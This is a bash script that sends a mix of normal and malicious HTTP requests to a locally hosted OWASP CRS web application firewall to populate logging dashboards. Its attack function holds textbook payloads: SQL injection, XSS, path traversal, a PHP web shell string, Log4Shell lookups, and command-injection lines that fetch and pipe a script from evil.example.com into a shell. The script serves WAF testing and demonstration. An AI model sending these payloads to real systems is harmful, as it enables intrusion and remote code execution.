#!/usr/bin/env bash
#
# Generate a mix of legitimate and malicious HTTP requests against a CRS
# protected endpoint, so that the dashboards have something to show.
#
# Usage:
#   ./generate-traffic.sh [COUNT]
#
# Environment:
#   TARGET  base URL of the WAF            (default: http://localhost:8080)
#   DELAY   seconds to sleep between calls (default: 0.2)
#   ATTACK_RATIO  percentage of malicious requests (default: 30)
#
# Nothing here is exotic: every payload is a textbook example that CRS at
# paranoia level 1 or 2 is expected to flag. The point is not to bypass the
# WAF, it is to produce a realistic looking log stream.

set -euo pipefail

TARGET="${TARGET:-http://localhost:8080}"
DELAY="${DELAY:-0.2}"
ATTACK_RATIO="${ATTACK_RATIO:-30}"
COUNT="${1:-200}"

# A handful of fake client addresses, sent as X-Forwarded-For. The sample
# stacks trust that header from private address ranges (see
# waf/nginx-realip.conf for ModSecurity, grafana-loki/coraza/Caddyfile for
# Coraza), so these show up as the client addresses in the logs. In
# production, trust it only from your own load balancers.
CLIENTS=(203.0.113.10 203.0.113.11 203.0.113.42 198.51.100.7 198.51.100.23 192.0.2.99)
BROWSERS=(
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
)

# Print one of the arguments at random (works with the bash 3.2 that ships
# with macOS, which has no namerefs).
pick() { local items=("$@"); echo "${items[$((RANDOM % ${#items[@]}))]}"; }

# request LABEL METHOD PATH [curl args...]
request() {
  local label="$1" method="$2" path="$3"
  shift 3
  local code
  code=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" \
    -H "X-Forwarded-For: $(pick "${CLIENTS[@]}")" \
    -A "$(pick "${BROWSERS[@]}")" \
    "$@" "${TARGET}${path}" || true)  # curl already prints 000 on failure
  printf '%-22s %s %-6s %s\n' "[$label]" "$code" "$method" "$path"
}

legit() {
  case $((RANDOM % 10)) in
    0) request legit GET "/" ;;
    1) request legit GET "/api/users?id=$((RANDOM % 500))" ;;
    2) request legit GET "/search?q=open+source+waf" ;;
    3) request legit GET "/products?category=books&page=$((RANDOM % 9 + 1))" ;;
    4) request legit POST "/api/login" -H "Content-Type: application/json" \
         --data '{"user":"alice","password":"correct horse battery staple"}' ;;
    5) request legit GET "/blog/2026/logging-with-crs" ;;
    6) request legit GET "/static/app.js" ;;
    7) request legit GET "/health" ;;
    # Legitimate, but CRS blocks it out of the box: PUT is not in the
    # default list of allowed methods (rule 911100). A classic false
    # positive, left in on purpose so that it shows up in the dashboards.
    8) request legit-put PUT "/api/profile/42" -H "Content-Type: application/json" \
         --data '{"name":"Alice","bio":"I like it when the WAF stays quiet."}' ;;
    9) request legit GET "/docs/getting-started?lang=en" ;;
  esac
}

attack() {
  case $((RANDOM % 19)) in
    0) request sqli-libinjection GET "/products?id=1%27%20OR%201%3D1--" ;;
    1) request sqli-union GET "/products?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--" ;;
    2) request sqli-comment-pl2 GET "/products?id=1%2F*%2150000union*%2Fselect%201" ;;
    3) request xss-script GET "/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E" ;;
    4) request xss-onerror POST "/comment" --data "text=<img src=x onerror=alert(1)>" ;;
    5) request lfi GET "/download?file=../../../../etc/passwd" ;;
    6) request rfi GET "/index.php?page=http://evil.example.com/shell.txt" ;;
    7) request rce GET "/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd" ;;
    8) request rce-wget GET "/cgi-bin/test?cmd=wget%20http%3A%2F%2Fevil.example.com%2Fx.sh%7Csh" ;;
    9) request php-injection POST "/upload" --data "data=<?php system(\$_GET['cmd']); ?>" ;;
    10) request scanner-nikto GET "/" -A "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)" ;;
    11) request scanner-sqlmap GET "/products?id=1" -A "sqlmap/1.8.4#stable (https://sqlmap.org)" ;;
    12) request java-log4shell GET "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example.com%2Fa%7D" \
          -H "User-Agent: \${jndi:ldap://evil.example.com/a}" ;;
    13) request protocol-numeric-host GET "/" -H "Host: 127.0.0.1" ;;
    14) request protocol-method TRACE "/" ;;
    15) request protocol-content-type POST "/api/login" -H "Content-Type: application/x-shockwave-flash" --data "x=1" ;;
    16) request restricted-file GET "/.git/config" ;;
    17) request session-fixation GET "/login?PHPSESSID=abc123def456" -H "Referer: http://evil.example.com/" ;;
    # Only scores at paranoia level 2 (rule 920300, 2 points): with blocking
    # at PL1 and detection at PL2 this is logged but never blocked.
    18) request missing-accept-pl2 GET "/api/users?id=7" -H "Accept:" ;;
  esac
}

echo "Sending ${COUNT} requests to ${TARGET} (${ATTACK_RATIO}% malicious)..."
for ((i = 1; i <= COUNT; i++)); do
  if (( RANDOM % 100 < ATTACK_RATIO )); then attack; else legit; fi
  sleep "$DELAY"
done
echo "Done."
